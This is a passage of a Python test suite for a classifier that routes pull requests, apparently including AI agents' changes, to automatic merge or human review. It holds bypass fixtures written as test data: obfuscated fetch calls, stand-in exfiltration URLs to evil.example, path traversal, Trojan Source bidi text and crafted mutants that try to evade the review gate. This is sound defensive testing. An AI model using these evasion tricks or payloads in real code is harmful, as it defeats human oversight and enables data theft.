#!/usr/bin/env python3
"""Fixture tests for scripts/autonomy_class.py and autonomy-class.yml (\u00a711 R1).

Run:  AUTONOMY_TS_DIR=<dir of typescript@5.9.3> python3 -m pytest scripts/test_autonomy_class.py
      (stdlib unittest + node. The parser can also come from the repo's
      node_modules after `pnpm install --frozen-lockfile`, or from
      `autonomy_class.py install-parser`, which checks the lockfile hash.)

Every case runs the REAL lists in .github/autonomy/ through the REAL
classifier. Fixtures are REST-shaped PR bundles (what `collect` produces).
Where the plan names a real file (BillingButton, LoginForm, ...), its real
bytes are read from the repo, so a fixture cannot drift from the file it is
about.

Structure:
  * PositiveControl  — non-vacuity first: a pure component style change and a
                       design note MUST be `auto`. A checker that refuses
                       everything would pass every other test; this fails it.
  * PlanFixtures     — the exact list in plan R1 ("Fixture tests ... prove").
  * Bypass           — rename, symlink, binary, huge diff, path tricks, case
                       variants, Unicode lookalikes, obfuscated content,
                       import laundering, partial file lists, forks.
  * ReviewMutants    — the 15 bypasses from review R1 (PR351-R1-mutants.py),
                       each asserted human FOR ITS RULE.
  * ImportAllowList  — the import allow list, canonicalisation, resolution
                       against the head tree, scan views.
  * NetworkAndScope  — network forms; code-vs-docs pattern scope; base ref.
  * ListParsing      — deny wins; malformed lists fail (and so post human).
  * CollectStub      — the REST half against a stub `gh`: tree modes, head
                       moved, any API failure or truncation -> human.
  * ContentOnlyMutants — all 15 R1 + 30 R2 review mutants, each `human`
                       head-only, over a plain base, and over a same-shape
                       base with benign literals (R8 must name it).
  * ContentOnly      — R8 itself: positive controls (JSX text, text attribute,
                       prose constant, CSS colour -> `auto`), negative controls
                       (same edit + new identifier/attribute/import -> human),
                       literal position/value rules, parse errors, pinning.
  * WorkflowStatic   — the workflow file's security properties.
"""

from __future__ import annotations

import base64
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)
import autonomy_class as ac

LISTS = ac.load_lists(os.path.join(ROOT, ".github", "autonomy"))
WORKFLOW = os.path.join(ROOT, ".github", "workflows", "autonomy-class.yml")

STYLE_CSS = b""".row {\n  display: flex;\n  gap: 12px;\n  padding: 8px 12px;\n}\n"""
STYLE_TSX = b"""import { useState } from 'react';

export function Pill({ label }: { label: string }) {
  const [on] = useState(false);
  return <span className={on ? 'row on' : 'row'}>{label}</span>;
}
"""
# Every path in the repo at HEAD: imports are resolved against the head tree.
REPO_TREE = subprocess.run(
    ["git", "-C", ROOT, "ls-files"], capture_output=True, text=True, check=True
).stdout.split()


def real(path: str) -> bytes:
    with open(os.path.join(ROOT, path), "rb") as f:
        return f.read()


def fe(filename, content=STYLE_TSX, status="modified", **kw):
    d = {
        "filename": filename,
        "status": status,
        "additions": 1,
        "deletions": 1,
        "patch": "@@ -1 +1 @@\n-a\n+b",
        "type": "file",
        "content_b64": (
            base64.b64encode(content).decode() if content is not None else None
        ),
    }
    # R8 compares head with base. By default the base is the SAME bytes (no
    # change at all), so these fixtures exercise R0-R7 on their own; the
    # ContentOnly tests below pass a real base.
    if status == "modified":
        b = kw.pop("base", content)
        d["base_type"] = kw.pop("base_type", "file")
        d["base_content_b64"] = base64.b64encode(b).decode() if b is not None else None
    else:
        kw.pop("base", None)
    d.update(kw)
    return d


def bundle(*files, tree=None, **pr):
    p = {
        "changed_files": len(files),
        "head_repo": "o/r",
        "base_repo": "o/r",
        "base_ref": "v3/main",
    }
    p.update(pr)
    names = [f.get("filename") for f in files if isinstance(f.get("filename"), str)]
    return {
        "pr": p,
        "files": list(files),
        "tree": (REPO_TREE if tree is None else tree) + names,
    }


def run(b, lists=LISTS):
    return ac.classify(lists, b)


def reasons(v):
    return v["pr_reasons"] + [r for f in v["files"] for r in f["reasons"]]


class Base(unittest.TestCase):
    def assertHuman(self, b, *must_contain, lists=LISTS):
        v = run(b, lists)
        self.assertEqual(v["verdict"], "human", json.dumps(v, indent=1))
        rs = " | ".join(reasons(v))
        for frag in must_contain:
            self.assertIn(frag, rs, rs)
        return v

    def assertAuto(self, b, lists=LISTS):
        v = run(b, lists)
        self.assertEqual(v["verdict"], "auto", json.dumps(v, indent=1))
        return v


# -- 1. non-vacuity first -----------------------------------------------------
class PositiveControl(Base):
    def test_pure_component_style_change_is_auto(self):
        self.assertAuto(
            bundle(fe("apps/web/src/components/play/Pill.module.css", STYLE_CSS))
        )

    def test_pure_component_tsx_change_is_auto(self):
        self.assertAuto(bundle(fe("apps/web/src/components/play/Pill.tsx", STYLE_TSX)))

    def test_real_component_one_line_edit_is_auto(self):
        p = "apps/web/src/components/play/PartPills.tsx"
        self.assertAuto(bundle(fe(p, real(p))))

    def test_real_css_module_and_design_note_together_are_auto(self):
        css = "apps/web/src/components/play/Mixer.module.css"
        self.assertAuto(
            bundle(
                fe(css, real(css)),
                fe("docs/design/nav-wrap.md", b"# Nav wrap\n\nWrap at 360px.\n"),
            )
        )

    def test_added_and_renamed_within_allow_are_human(self):
        # Content-only needs a base version of the same path (R8), so an added
        # or renamed file is never auto, even inside the allow list.
        self.assertHuman(
            bundle(
                fe("apps/web/src/components/play/New.tsx", status="added"),
                fe(
                    "apps/web/src/components/play/B.tsx",
                    status="renamed",
                    previous_filename="apps/web/src/components/play/A.tsx",
                ),
            ),
            "R2 status 'added'",
            "R2 status 'renamed'",
        )

    def test_safe_imports_are_auto(self):
        src = b"import { x } from '@/lib/play/types';\nimport y from './Sheet';\nimport z from 'react';\n"
        self.assertAuto(bundle(fe("apps/web/src/components/play/X.tsx", src)))


# -- 2. the plan's named fixtures ---------------------------------------------
class PlanFixtures(Base):
    def test_billing_button_one_line_style_edit_denied_by_WHOLE_FILE_content(self):
        p = "apps/web/src/components/BillingButton.tsx"
        v = self.assertHuman(bundle(fe(p, real(p))), "R6 whole-file content")
        # The point of this fixture (C2): the edited line is pure style, so the
        # content hit must come from UNCHANGED lines. Prove it with a path the
        # deny globs don't know, so path rules cannot be what refused it.
        v = self.assertHuman(
            bundle(
                fe(
                    "apps/web/src/components/play/Btn.tsx",
                    real(p),
                    patch="@@\n-  gap: 4px\n+  gap: 6px",
                )
            ),
            "R6",
        )
        self.assertFalse(
            any(r.startswith(("R3", "R4")) for r in reasons(v)), reasons(v)
        )

    def test_login_form(self):
        p = "apps/web/src/components/LoginForm.tsx"
        self.assertHuman(bundle(fe(p, real(p))), "deny **/LoginForm*")

    def test_delete_account_form(self):
        p = "apps/web/src/components/DeleteAccountForm.tsx"
        self.assertHuman(bundle(fe(p, real(p))), "deny **/DeleteAccountForm*")

    def test_json_ld(self):
        p = "apps/web/src/components/seo/JsonLd.tsx"
        self.assertHuman(bundle(fe(p, real(p))), "deny **/JsonLd*")

    def test_reset_password_and_tool_form_by_name(self):
        self.assertHuman(
            bundle(fe("apps/web/src/components/ResetPasswordX.tsx")),
            "deny **/ResetPassword*",
        )
        self.assertHuman(
            bundle(fe("apps/web/src/components/landing/ToolForm.tsx")),
            "deny **/ToolForm*",
        )

    def test_test_file_inside_allowed_dir(self):
        self.assertHuman(
            bundle(fe("apps/web/src/components/__tests__/Pill.test.tsx")),
            "deny **/__tests__/**",
        )
        self.assertHuman(
            bundle(fe("apps/web/src/components/play/Pill.test.tsx")), "deny **/*.test.*"
        )

    def test_privacy_edit(self):
        self.assertHuman(
            bundle(fe("apps/web/src/app/(landing)/privacy/page.tsx")),
            "deny apps/web/src/app/(landing)/privacy/**",
        )

    def test_journey_test(self):
        p = "packages/web-browser-gate/journeys/j11-library.mjs"
        self.assertHuman(bundle(fe(p, real(p))), "deny packages/web-browser-gate/**")

    def test_agent_registry_doc(self):
        self.assertHuman(
            bundle(fe("docs/agent-registry.md", b"# Agents\n")), "deny docs/agent*"
        )

    def test_claude_agent_definition(self):
        self.assertHuman(
            bundle(fe(".claude/agents/x.md", b"# agent\n")), "deny **/.claude/**"
        )

    def test_other_seeded_denies(self):
        for p, g in [
            (".github/workflows/ci.yml", ".github/**"),
            (".github/autonomy/allow.txt", ".github/**"),
            (".github/CODEOWNERS", "**/CODEOWNERS"),
            ("AGENTS.md", "**/AGENTS.md"),
            ("CLAUDE.md", "**/CLAUDE.md"),
            ("apps/web/CLAUDE.local.md", "**/CLAUDE.local.md"),
            ("apps/web/src/components/SKILL.md", "**/SKILL.md"),
            (".mcp.json", "**/.mcp.json"),
            ("scripts/autonomy_class.py", "scripts/**"),
            (".env.local", "**/.env*"),
            ("apps/worker/migrations/040_x.sql", "**/migrations/**"),
            ("apps/web/src/lib/billing/providers/stripe.ts", "**/*stripe*"),
            ("apps/web/src/app/api/billing/webhook/route.ts", "**/*billing*/**"),
            ("apps/web/src/app/api/entitlements/route.ts", "**/*entitlement*/**"),
            ("apps/web/src/stripe/hooks.ts", "**/*stripe*/**"),
            ("apps/web/src/components/credits/Badge.tsx", "**/*credit*/**"),
            ("apps/web/src/components/session/Badge.tsx", "**/*session*/**"),
            ("apps/web/src/app/pricing/page.tsx", "**/*pricing*/**"),
            ("apps/web/src/lib/auth/supabase.ts", "**/*auth*/**"),
            ("apps/web/src/middleware.ts", "**/middleware.*"),
            ("apps/web/src/app/layout.tsx", "**/layout.*"),
            ("apps/web/next.config.js", "**/next.config.*"),
            ("package.json", "**/package.json"),
            ("pnpm-lock.yaml", "**/pnpm-lock.yaml"),
            ("apps/worker/src/worker/billing/x.py", "apps/worker/**"),
            ("docs/runbook-restore.md", "**/*runbook*"),
        ]:
            with self.subTest(p=p):
                self.assertHuman(bundle(fe(p, b"x\n")), f"deny {g}")

    def test_content_patterns_named_in_plan(self):
        for snippet in [
            b"const s = 'stripe';",
            b"post('/api/billing/x')",
            b"// checkout",
            b"entitlement",
            b"allowance",
            b"<p>3 credits left</p>",
            b"await fetch(url)",
            b"process.env.X",
            b"<div dangerouslySetInnerHTML={{__html: x}} />",
            b"// [billing]",
            b"SELECT * FROM jobs",
            b"service_role",
            b"eval('1')",
            b"import cp from 'child_process'",
        ]:
            with self.subTest(snippet=snippet):
                body = b"export const A = 1;\n" + snippet + b"\n"
                self.assertHuman(
                    bundle(fe("apps/web/src/components/play/X.tsx", body)), "R6"
                )


# -- 3. bypass attempts -------------------------------------------------------
class Bypass(Base):
    C = "apps/web/src/components/play/"

    # renames / copies
    def test_rename_from_denied_into_allowed(self):
        self.assertHuman(
            bundle(
                fe(
                    self.C + "settings.tsx",
                    status="renamed",
                    previous_filename=".claude/settings.json",
                )
            ),
            "R3 .claude/settings.json",
        )

    def test_rename_from_unallowed_into_allowed(self):
        self.assertHuman(
            bundle(
                fe(
                    self.C + "engine.ts",
                    status="renamed",
                    previous_filename="apps/web/src/lib/play/engine.ts",
                )
            ),
            "R4 apps/web/src/lib/play/engine.ts",
        )

    def test_copy_and_mode_change_and_removal_are_human(self):
        self.assertHuman(
            bundle(
                fe(
                    self.C + "A.tsx",
                    status="copied",
                    previous_filename=self.C + "B.tsx",
                )
            ),
            "R2",
        )
        self.assertHuman(bundle(fe(self.C + "A.tsx", status="changed")), "R2")
        self.assertHuman(bundle(fe(self.C + "A.tsx", status="removed")), "R2")
        self.assertHuman(bundle(fe(self.C + "A.tsx", status="weird")), "R2")

    # file objects
    def test_symlink_executable_submodule(self):
        for t in ("symlink", "executable", "submodule", "missing", "mode 100664"):
            with self.subTest(t=t):
                self.assertHuman(
                    bundle(fe(self.C + "A.tsx", b"../../../.env", type=t)), "R5"
                )

    def test_binary_file(self):
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", b"\x89PNG\r\n\x1a\n\x00\xff", patch=None)), "R5"
        )
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", b"ok\x00nul")), "control character U+0000"
        )
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", b"\xff\xfe bad utf8")), "not UTF-8"
        )
        self.assertHuman(
            bundle(fe("docs/design/shot.png", b"\x89PNG", patch=None)), "R4"
        )

    def test_text_file_without_patch_is_human(self):
        # GitHub omits `patch` for binaries AND for very large diffs; the head
        # bytes alone are not enough to trust the change.
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", STYLE_TSX, patch=None)), "no textual patch"
        )

    def test_missing_or_bad_content(self):
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", None)), "head content was not read"
        )
        f = fe(self.C + "A.tsx")
        f["content_b64"] = "!!!not base64"
        self.assertHuman(bundle(f), "not valid base64")

    # sizes
    def test_huge_diff(self):
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", additions=1501, deletions=0)), "changed lines"
        )
        many = [fe(f"{self.C}F{i}.tsx") for i in range(ac.MAX_FILES + 1)]
        self.assertHuman(bundle(*many), "MAX_FILES")
        self.assertHuman(
            bundle(fe(self.C + "A.tsx", b"/*" + b"a" * ac.MAX_FILE_BYTES + b"*/")),
            "bytes",
        )

    def test_partial_empty_or_unreadable_file_list(self):
        self.assertHuman(bundle(fe(self.C + "A.tsx"), changed_files=2), "partial")
        self.assertHuman(bundle(), "empty file list")
        b = bundle(fe(self.C + "A.tsx"))
        b["collect_error"] = "gh api exited 1"
        self.assertHuman(b, "could not read")
        self.assertHuman({"pr": {}, "files": None}, "file list missing")

    def test_fork(self):
        self.assertHuman(bundle(fe(self.C + "A.tsx"), head_repo="evil/r"), "fork")
        self.assertHuman(bundle(fe(self.C + "A.tsx"), head_repo=None), "fork")

    # path tricks
    def test_dot_dot_and_friends(self):
        for p in [
            "apps/web/src/components/../../../../.github/workflows/x.tsx",
            "apps/web/src/components/./A.tsx",
            "apps/web/src/components//A.tsx",
            "/apps/web/src/components/A.tsx",
            "apps\\web\\src\\components\\A.tsx",
            "apps/web/src/components/A .tsx",
            "apps/web/src/components/A\n.tsx",
            "",
            "apps/web/src/components/" + "a" * 300 + ".tsx",
        ]:
            with self.subTest(p=p):
                self.assertHuman(bundle(fe(p)), "R1")

    def test_previous_filename_path_tricks(self):
        self.assertHuman(
            bundle(
                fe(
                    self.C + "A.tsx",
                    status="renamed",
                    previous_filename="apps/web/src/components/../../../CLAUDE.md",
                )
            ),
            "R1",
        )

    def test_case_variants_are_denied_not_allowed(self):
        self.assertHuman(bundle(fe(".CLAUDE/agents/x.md", b"x")), "R3")
        self.assertHuman(bundle(fe("apps/web/src/components/Claude.md", b"x")), "R3")
        self.assertHuman(bundle(fe("apps/web/src/components/agents.MD", b"x")), "R3")
        self.assertHuman(bundle(fe("apps/web/src/components/billingButton.tsx")), "R3")
        # allow is exact-case: a directory spelled differently is not allowed
        self.assertHuman(bundle(fe("apps/web/src/Components/play/A.tsx")), "R4")
        self.assertHuman(bundle(fe("apps/web/src/components/play/A.TSX")), "R4")

    def test_unicode_lookalike_paths(self):
        for p in [
            "apps/web/src/c\u03bfmponents/A.tsx",  # Greek omicron
            ".cl\u0430ude/agents/x.md",  # Cyrillic a
            "apps/web/src/components/A\u200b.tsx",  # zero-width space
            "apps/web/src/components/\uff21.tsx",  # full-width A
        ]:
            with self.subTest(p=p):
                self.assertHuman(bundle(fe(p)), "non-ASCII")

    def test_unallowed_extension_inside_allowed_dir(self):
        for p in ["A.js", "A.mjs", "a.json", "a.svg", "a.css", "a.md"]:
            with self.subTest(p=p):
                self.assertHuman(bundle(fe(self.C + p)), "R4")

    # content obfuscation
    def test_content_obfuscations(self):
        for snippet in [
            "const f = globalThis['fe' + 'tch'];",
            "const f = window['fetch'];",
            "Reflect.apply(x, y, z)",
            "new Function('return 1')",
            "const f = atob('ZmV0Y2g=');",
            "String.fromCharCode(102)",
            "const s = '\\u0066etch';",
            "const s = '\\x66etch';",
            "const m = await import('./x');",
            "const m = require('fs');",
            "const u = 'https://evil.example/collect';",
            "\uff46\uff45\uff54\uff43\uff48(u)",  # full-width fetch( -> NFKC
            "el.innerHTML = x;",
            "<a href='javascript:alert(1)'>x</a>",
            "const s = sql`select 1`;",
            "supabase.rpc('x')",
        ]:
            with self.subTest(snippet=snippet):
                body = ("export const A = 1;\n" + snippet + "\n").encode()
                self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "R6")

    def test_svg_namespace_url_is_not_a_new_host(self):
        body = b'export const I = () => <svg xmlns="http://www.w3.org/2000/svg" />;\n'
        self.assertAuto(bundle(fe(self.C + "Icon.tsx", body)))

    def test_bidi_trojan_source(self):
        body = "const isAdmin = false; /* \u202e } \u2066if (isAdmin)\u2069 \u2066 */\n".encode()
        self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "bidi")

    # imports (C1)
    def test_imports_from_denied_modules(self):
        for line, frag in [
            ("import { x } from '@/lib/billing';", "lib/billing"),
            ("import { x } from '@/lib/billing/credits';", "lib/billing"),
            ("import { x } from '../../lib/billing/index';", "lib/billing"),
            ("import { x } from '@/lib/auth/supabase';", "lib/auth"),
            ("import { x } from '@/lib/jobs/create-link-job';", "lib/jobs"),
            ("import { x } from '@/app/api/billing/checkout/route';", "app/api"),
            ("import { createClient } from '@supabase/ssr';", "@supabase"),
            ("import Stripe from 'stripe';", "stripe"),
            ("import LoginForm from '@/components/LoginForm';", "LoginForm"),
            ("import B from '../BillingButton';", "BillingButton"),
            ("export { x } from '@/lib/auth/types';", "lib/auth"),
            ("import '@/lib/billing/index';", "lib/billing"),
            ("import fs from 'node:fs';", "node:"),
            ("import { headers } from 'next/headers';", "next/headers"),
        ]:
            with self.subTest(line=line):
                body = (line + "\nexport const A = 1;\n").encode()
                self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "R7", frag)

    def test_css_import(self):
        body = b"@import '../../lib/billing/x.css';\n.a { color: red; }\n"
        self.assertHuman(bundle(fe(self.C + "X.module.css", body)), "R7")

    def test_import_escaping_repo_or_unresolvable(self):
        body = b"import x from '../../../../../../etc/passwd';\n"
        self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "escapes the repo")
        body = b"import x from '/abs/path';\n"
        self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "unresolvable")

    def test_import_rule_applies_even_when_content_rules_are_quiet(self):
        # No content pattern fires on this file; only the import rule can.
        body = b"import { rules } from '@/lib/auth/password-rules';\nexport const A = rules;\n"
        v = self.assertHuman(bundle(fe(self.C + "X.tsx", body)), "R7")
        self.assertFalse(any(r.startswith("R6") for r in reasons(v)), reasons(v))

    def test_one_bad_file_makes_whole_pr_human(self):
        self.assertHuman(
            bundle(fe(self.C + "Ok.tsx"), fe("AGENTS.md", b"x")), "R3 AGENTS.md"
        )


# -- 3b. review R1 mutants (PR351-R1-mutants.py), kept as permanent fixtures --
# Each of these came back `auto` at bf9192b. Every one must be `human`, and
# for the RULE named, not by accident (e.g. not merely for a missing base_ref).
REVIEW_MUTANTS = {
    "M1 dot-segment alias import of lib/billing": (
        (
            'import { getBillingProvider } from "@/lib/./billing";\n'
            "export const A=()=>{getBillingProvider();return null};\n"
        ),
        "dot segment in alias import",
    ),
    "M2 dot-segment alias import of lib/jobs": (
        (
            'import * as j from "@/lib/./jobs/create-link-job";\n'
            "export const A=()=>{void j;return null};\n"
        ),
        "dot segment in alias import",
    ),
    "M3 comment between from and specifier": (
        'import * as b from/**/"@/lib/billing";\nexport const A=()=>{void b;return null};\n',
        "matches import: apps/web/src/lib/billing",
    ),
    "M4 dynamic import with comment": (
        'export async function A(){ const m = await import/**/("@/lib/billing"); return m; }\n',
        r"code: \bimport(?:",
    ),
    "M5 un-denied server lib (DB DELETE)": (
        (
            '"use server";\nimport { deleteLibraryEntry } from "@/lib/library-server";\n'
            "export async function zap(id: string, u: string)"
            "{ return deleteLibraryEntry(id, u); }\n"
        ),
        "use server",
    ),
    "M6 email dispatch (sends mail, reads billing)": (
        'import * as d from "@/lib/emails/dispatch";\nexport const A=()=>{void d;return null};\n',
        "R7 imports '@/lib/emails/dispatch'",
    ),
    "M7 fetch alias call": (
        (
            "const go = 1; const f = fetch; export const A=()=>"
            '{f("/api/library/x",{method:"DELETE"});return null};\n'
        ),
        r"code: \bfetch\b",
    ),
    "M8 fetch tagged template": (
        "export const A=()=>{fetch`/api/jobs`;return null};\n",
        r"code: \bfetch\b",
    ),
    "M9 form POST to API": (
        (
            'export const A=()=> <form action="/api/library/remake" method="post">'
            "<button>go</button></form>;\n"
        ),
        r"code: \baction\s*=",
    ),
    "M10 protocol-relative 3rd-party host": (
        'export const A=()=> <img src="//evil.example/p.gif" alt="" />;\n',
        "code: (?<![\\w:])//",
    ),
    "M11 query suffix import": (
        (
            'import { getBillingProvider } from "@/lib/billing?x";\n'
            "export const A=()=>{getBillingProvider();return null};\n"
        ),
        "non-canonical import specifier",
    ),
    "M12 @/.. re-entry": (
        'import * as b from "@/../src/lib/billing";\nexport const A=()=>{void b;return null};\n',
        "dot segment in alias import",
    ),
    "M13 auth via dot alias": (
        (
            'import { getUser } from "@/lib/./auth/supabase";\n'
            "export const A=()=>{void getUser;return null};\n"
        ),
        "dot segment in alias import",
    ),
    "M14 next/headers via comment": (
        'import { cookies } from/* */"next/headers";\nexport const A=()=>{void cookies;return null};\n',
        "matches import: next/headers",
    ),
}


class ReviewMutants(Base):
    C = "apps/web/src/components/x/Evil.tsx"

    def test_each_review_mutant_is_human_for_its_rule(self):
        for name, (src, why) in REVIEW_MUTANTS.items():
            with self.subTest(name=name):
                self.assertHuman(bundle(fe(self.C, src.encode())), why)

    def test_m15_css_protocol_relative_url(self):
        css = b".a{background:url(//evil.example/p.gif)}\n"
        self.assertHuman(
            bundle(fe("apps/web/src/components/x/a.module.css", css)),
            "code: (?<![\\w:])//",
        )

    def test_control_relative_billing_import(self):
        src = b'import * as b from "../../lib/billing";\n'
        self.assertHuman(
            bundle(fe(self.C, src)), "matches import: apps/web/src/lib/billing"
        )


class ImportAllowList(Base):
    """Review R1 #3: the import rule is an allow list over lib/ and packages."""

    C = "apps/web/src/components/play/X.tsx"

    def imp(self, line):
        return bundle(fe(self.C, (line + "\nexport const A = 1;\n").encode()))

    def test_listed_pure_modules_and_packages_are_auto(self):
        for line in [
            "import { X } from '@/lib/play/types';",
            "import { X } from '../../lib/play/types';",
            "import { X } from '../../lib/play/types.ts';",
            "import { X } from '@/lib/ui/form-styles';",
            "import { X } from '@/chord/alphabet';",
            "import { useState } from 'react';",
            "import { useRouter } from 'next/navigation';",
            "import type { Job } from '@stem-loops/types';",
            "import Sheet from './Sheet';",
            "import styles from './Mixer.module.css';",
            "import Pills from '@/components/play/PartPills';",
        ]:
            with self.subTest(line=line):
                self.assertAuto(self.imp(line))

    def test_unlisted_lib_module_is_human(self):
        # Real modules components import today that are NOT pure.
        for mod in [
            "@/lib/play/sections",
            "@/lib/play/presets",
            "@/lib/set-lists",
            "@/lib/library",
            "@/lib/library-server",
            "@/lib/set-lists-server",
            "@/lib/emails/resend",
            "@/lib/job-access",
            "@/lib/demo-rate",
            "@/lib/read-rate-limit",
            "@/lib/public-config",
            "@/lib/upload-client",
        ]:
            with self.subTest(mod=mod):
                self.assertHuman(self.imp(f"import * as m from '{mod}';"), "R7")

    def test_unlisted_package_is_human(self):
        for pkg in [
            "axios",
            "swr",
            "ky",
            "@vercel/analytics/next",
            "next/script",
            "next/server",
        ]:
            with self.subTest(pkg=pkg):
                self.assertHuman(self.imp(f"import x from '{pkg}';"), "R7")

    def test_denied_component_and_unallowed_targets_are_human(self):
        for line, why in [
            ("import L from '@/components/LoginForm';", "LoginForm"),
            ("import S from '@/components/SiteAnalytics';", "not an allowed path"),
            (
                "import T from '@/components/__tests__/ChordOverlay.test.mjs';",
                "not an allowed",
            ),
            ("import R from '@/app/api/billing/checkout/route';", "R7"),
            ("import M from '@/middleware';", "R7"),
        ]:
            with self.subTest(line=line):
                self.assertHuman(self.imp(line), why)

    def test_non_canonical_specifiers_are_human(self):
        for spec in [
            "@/lib/./play/types",
            "@/lib/play/../play/types",
            "@/lib//play/types",
            "@/lib/play/types?raw",
            "@/lib/play/types#x",
            "@/lib/play/types/",
            "./../play/X",
            "../../lib/./play/types",
            "@/lib/play/types%2e",
            "@/lib/pl\\u0061y/types",
            "../../../../../../etc/passwd",
            "/abs/path",
            "node:fs",
            "",
        ]:
            with self.subTest(spec=spec):
                self.assertHuman(self.imp(f"import x from '{spec}';"), "R7")

    def test_case_variant_alias_is_not_the_allowed_file(self):
        # Exact-case allow list; on a case-insensitive disk this could load
        # lib/play/types, on Linux it does not resolve. Either way: human.
        self.assertHuman(self.imp("import x from '@/lib/Play/types';"), "R7")

    def test_missing_target_or_missing_tree_is_human(self):
        self.assertHuman(
            self.imp("import x from './DoesNotExist';"), "resolves to no file"
        )
        b = self.imp("import x from './Sheet';")
        del b["tree"]
        self.assertHuman(b, "head tree not available")

    def test_ambiguous_resolution_uses_the_first_existing_file(self):
        # ./Sheet with only Sheet.js present must judge Sheet.js (not allowed),
        # not a non-existent Sheet.tsx that would be.
        d = "apps/web/src/components/q/"
        b = bundle(
            fe(d + "X.tsx", b"import s from './Sheet';\nexport const A = s;\n"),
            tree=[d + "Sheet.js"],
        )
        self.assertHuman(b, "not an allowed path")

    def test_every_import_form_is_scanned(self):
        for line in [
            "export { x } from '@/lib/play/sections';",
            "export * from '@/lib/play/sections';",
            "import '@/lib/play/sections';",
            "import x, { y } from\n  '@/lib/play/sections';",
            "import x from // c\n '@/lib/play/sections';",
            "import x from /* a */ /* b */ '@/lib/play/sections';",
            "import x from `@/lib/play/sections`;",
        ]:
            with self.subTest(line=line):
                self.assertHuman(self.imp(line), "R7")

    def test_lexer_confusion_still_catches_the_import(self):
        # A regex literal holding a quote makes the comment stripper think a
        # string opened, so the stripped view keeps `from/**/"x"` intact. The
        # raw statement-start scan, which tolerates comments, still sees it.
        src = b"const r = /'/;\nimport * as b from/**/\"@/lib/play/sections\"; // '\nexport const A = b;\n"
        self.assertHuman(bundle(fe(self.C, src)), "R7")

    def test_raw_scan_catches_import_the_stripper_swallows(self):
        # `/x\/*/` is a valid regex literal, but the stripper reads `/*` as a
        # block comment and swallows up to the `*/` in a later string: the
        # import vanishes from the stripped view. Only the raw statement-start
        # scan can see it.
        src = (
            b"const r = /x\\/*/;\n"
            b"import * as b from '@/lib/play/sections';\n"
            b"const t = '*/';\nexport const A = [r, b, t];\n"
        )
        self.assertNotIn(b"sections", ac.strip_comments(src.decode()).encode())
        self.assertHuman(bundle(fe(self.C, src)), "R7")

    def test_stripped_scan_catches_import_after_a_leading_comment(self):
        # Not at a statement start in the raw text (a comment precedes it on
        # the line), so only the comment-stripped view sees this import.
        src = (
            b"/* hi */ import * as b from '@/lib/play/sections';\nexport const A = b;\n"
        )
        self.assertHuman(bundle(fe(self.C, src)), "R7")

    def test_prose_in_comments_is_not_an_import(self):
        src = b"// chords come from 'the provider' at runtime\nexport const A = 1;\n"
        self.assertAuto(bundle(fe(self.C, src)))

    def test_use_server_and_server_only(self):
        self.assertHuman(
            bundle(fe(self.C, b"'use server';\nexport const A = 1;\n")), "use server"
        )
        self.assertHuman(self.imp("import 'server-only';"), "server-only")


class NetworkAndScope(Base):
    C = "apps/web/src/components/play/X.tsx"

    def test_network_forms_are_human(self):
        for snippet in [
            "const f = fetch;",
            "window.fetch(u);",
            "fetch`x`;",
            "<button formAction={go}>x</button>",
            "<img src='//cdn.evil.example/x.png' />",
            "<a href='/api/jobs'>x</a>",
            "location.href = u;",
            "location.assign(u);",
            "window.open(u);",
            "new Image().src = u;",
            "navigator.sendBeacon(u);",
            "<iframe src='x' />",
            "<link rel='prefetch' href='x' />",
            "fe/**/tch(u);".replace("fe/**/tch", "fetch/**/"),
        ]:
            with self.subTest(snippet=snippet):
                body = ("export const A = 1;\n" + snippet + "\n").encode()
                self.assertHuman(bundle(fe(self.C, body)), "R6")

    def test_comment_split_tokens_match_in_stripped_view(self):
        for snippet in ["const q = sql/**/`select 1`;", "db.rpc/* x */('wipe');"]:
            with self.subTest(snippet=snippet):
                body = ("export const A = 1;\n" + snippet + "\n").encode()
                self.assertHuman(bundle(fe(self.C, body)), "R6")

    def test_next_link_component_is_not_an_html_link(self):
        body = b"import Link from 'next/link';\nexport const A = () => <Link href='/history'>x</Link>;\n"
        self.assertAuto(bundle(fe(self.C, body)))

    def test_design_note_gets_secrets_only_set(self):
        note = b"# Nav\n\nSee https://example.com/ref and the checkout page; fetch() is not called.\n"
        self.assertAuto(bundle(fe("docs/design/nav.md", note)))
        for secret in [b"process.env.X", b"sk_live_abc", b"SUPABASE_URL", b"[billing]"]:
            with self.subTest(secret=secret):
                self.assertHuman(
                    bundle(fe("docs/design/nav.md", b"# x\n" + secret + b"\n")), "R6"
                )

    def test_wrong_base_branch_is_human(self):
        self.assertHuman(bundle(fe(self.C), base_ref="feature-x"), "R0 base branch")
        self.assertHuman(bundle(fe(self.C), base_ref=None), "R0 base branch")


# -- 4. lists -----------------------------------------------------------------
class ListParsing(Base):
    def test_deny_wins_over_allow(self):
        L = ac.parse_lists("apps/**\n", "apps/secret/**\n", "react\n")
        self.assertAuto(bundle(fe("apps/ok/A.tsx")), lists=L)
        self.assertHuman(bundle(fe("apps/secret/A.tsx")), "R3", lists=L)

    def test_default_deny(self):
        self.assertHuman(
            bundle(fe("README.md", b"# hi\n")), "R4 README.md is not in allow.txt"
        )

    def test_malformed_lists_fail(self):
        for a, d in [
            ("x/**\n", "bogus: y\n"),
            ("x/**\n", "content: (unclosed\n"),
            ("content: x\n", "y/**\n"),
            ("", "y/**\n"),
            ("x/**\n", ""),
            ("/abs/**\n", "y\n"),
        ]:
            with self.subTest(a=a, d=d), self.assertRaises(ac.ListError):
                ac.parse_lists(a, d)

    def test_imports_allow_entries_are_exact(self):
        for bad in [
            "apps/web/src/lib/play/*",
            "apps/web/src/lib/**",
            "./x",
            "/abs",
            "a b",
        ]:
            with self.subTest(bad=bad), self.assertRaises(ac.ListError):
                ac.parse_lists("x/**\n", "y\n", bad + "\n")

    def test_real_lists_need_imports_allow(self):
        with tempfile.TemporaryDirectory() as d:
